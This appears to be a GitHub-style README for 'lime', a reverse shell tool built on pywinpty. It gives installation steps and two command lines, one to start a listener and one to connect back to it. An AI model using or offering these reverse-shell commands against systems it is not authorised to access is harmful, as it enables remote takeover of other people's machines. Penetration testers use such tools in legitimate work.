# lime
Lime is a simple reverse shell, that uses the Python Library pywinpty. It has full interactive shell.
# Installation
1. Download file "lime.exe".
2. Copy file into a chosen path.
3. Add that path to enviroment variables.
# Usage
In command prompt.
**For listener**
```cmd
lime listen -ip [ip address, if not specified listens on localhost] -p [port number]
```
**For connecting to a listener**
```
lime connect -ip [ip of listener] -p [port number]
```
